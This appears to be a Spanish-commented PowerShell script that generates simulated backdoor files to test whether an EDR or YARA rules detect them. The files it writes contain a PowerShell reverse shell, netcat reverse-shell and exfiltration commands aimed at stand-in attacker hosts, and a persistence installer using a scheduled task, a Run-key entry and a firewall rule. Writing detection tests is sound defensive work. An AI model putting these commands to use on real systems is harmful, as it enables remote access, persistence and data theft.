# ESCENARIO 3: Simulación de Backdoor
# Simula scripts típicos de acceso remoto no autorizado

Write-Host "`n🚪 SIMULACIÓN DE BACKDOOR - MODO SEGURO`n" -ForegroundColor Red

$testFolder = "$env:USERPROFILE\Desktop\BACKDOOR_TEST"
New-Item -Path $testFolder -ItemType Directory -Force | Out-Null

Write-Host "[FASE 1] Creando scripts de reverse shell..." -ForegroundColor Yellow

# Script PowerShell para reverse shell (SIMULADO)
$reverseShell = @"
# PowerShell Reverse Shell (SIMULACIÓN)
# Este script simula una conexión de backdoor

`$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
`$stream = `$client.GetStream()

Write-Host "[BACKDOOR] Connected to attacker server..."

# En un backdoor real, aquí se ejecutarían comandos remotos
while(`$true) {
    # Invoke-WebRequest para descargar payloads adicionales
    Invoke-WebRequest -Uri "http://malicious-server.com/payload.exe" -OutFile "`$env:TEMP\update.exe"
    
    # Invoke-Expression ejecutaría código remoto
    # IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
    
    Start-Sleep -Seconds 60
}
"@

$reverseShell | Out-File "$testFolder\backdoor.ps1" -Encoding UTF8

Write-Host "[FASE 2] Creando comandos Netcat simulados..." -ForegroundColor Yellow

$netcatCommands = @"
REM Netcat Reverse Shell Commands
REM Estos comandos establecen conexión remota al atacante

REM Opción 1: Shell reverso simple
nc.exe -e cmd.exe 192.168.1.100 4444

REM Opción 2: Listener para recibir conexiones
nc.exe -lvp 5555 -e cmd.exe

REM Opción 3: Transferencia de archivos
nc.exe -w 3 192.168.1.100 1234 < confidential_data.zip

REM Opción 4: Backdoor persistente
while(1) { nc.exe -e /bin/sh 192.168.1.100 8080 }
"@

$netcatCommands | Out-File "$testFolder\netcat_commands.bat"

Write-Host "[FASE 3] Simulando archivo de Netcat..." -ForegroundColor Yellow

$fakeNetcat = @"
NETCAT v1.12 - TCP/IP Swiss Army Knife
This is a simulated nc.exe file for testing.

In reality, this tool can:
- Create reverse shells: nc -e cmd.exe <attacker_IP> <port>
- Listen for connections: ncat -lvp <port>
- Transfer files between systems
- Port scanning

YARA should detect this based on strings like:
- nc.exe
- ncat
- -e cmd.exe
- -lvp
"@

$fakeNetcat | Out-File "$testFolder\nc.exe"

Write-Host "[FASE 4] Script de persistencia avanzada..." -ForegroundColor Yellow

$persistence = @"
@echo off
REM Script de instalación de backdoor persistente

echo [*] Installing backdoor service...

REM Copiar backdoor a ubicación oculta
copy /y backdoor.ps1 "%APPDATA%\Microsoft\SystemUpdate.ps1"
copy /y nc.exe "%APPDATA%\Microsoft\svchost.exe"

REM Tarea programada (ejecutar cada hora)
schtasks /create /tn "MicrosoftUpdateService" /tr "powershell.exe -WindowStyle Hidden -File '%APPDATA%\Microsoft\SystemUpdate.ps1'" /sc hourly /f

REM Registro de inicio automático
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "%APPDATA%\Microsoft\svchost.exe -e cmd.exe 192.168.1.100 4444" /f

REM Abrir puerto en firewall
netsh advfirewall firewall add rule name="Remote Desktop Extended" dir=in action=allow protocol=TCP localport=4444

echo [+] Backdoor installed successfully!
echo [*] Connecting to C2 server...

powershell.exe -ExecutionPolicy Bypass -File backdoor.ps1
"@

$persistence | Out-File "$testFolder\install_backdoor.bat"

Write-Host "[FASE 5] Creando archivo de configuración C2..." -ForegroundColor Yellow

$c2Config = @"
{
  "server": "192.168.1.100",
  "port": 4444,
  "reconnect_interval": 60,
  "encryption": "AES256",
  "payload_url": "http://c2server.onion/payloads/",
  "exfiltration_target": "ftp://attacker.com/stolen_data/",
  "persistence": true,
  "antivirus_evasion": true,
  "keylogger_enabled": true,
  "screenshot_interval": 300
}
"@

$c2Config | Out-File "$testFolder\config.json"

Write-Host "`n✅ Simulación creada en: $testFolder" -ForegroundColor Green
Write-Host "`n🎯 TU EDR DEBERÍA DETECTAR:" -ForegroundColor Cyan
Write-Host "   • backdoor.ps1 (YARA: Suspicious_PowerShell_Download)" -ForegroundColor White
Write-Host "   • netcat_commands.bat (YARA: Backdoor_Netcat)" -ForegroundColor White
Write-Host "   • nc.exe (YARA: Backdoor_Netcat + Extensión .exe)" -ForegroundColor White
Write-Host "   • install_backdoor.bat (YARA: Suspicious_Batch_Commands)`n" -ForegroundColor White

Write-Host "🔥 NIVEL DE AMENAZA: CRÍTICO" -ForegroundColor Red
Write-Host "   Este escenario simula un ataque APT (Advanced Persistent Threat)`n" -ForegroundColor Red

Start-Process explorer.exe $testFolder
